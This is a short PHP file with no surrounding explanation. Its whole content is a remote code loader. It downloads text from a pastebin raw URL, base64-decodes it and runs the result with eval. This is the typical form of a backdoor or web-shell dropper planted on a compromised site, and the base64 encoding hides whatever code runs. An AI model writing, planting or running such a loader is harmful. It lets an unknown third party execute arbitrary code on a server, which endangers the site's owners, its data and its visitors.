<?php

$qwe = "http://pastebin.com/raw/kjbWRsFj";
$qwer  = file_get_contents($qwe); 
eval("?>".(base64_decode($qwer)));

?>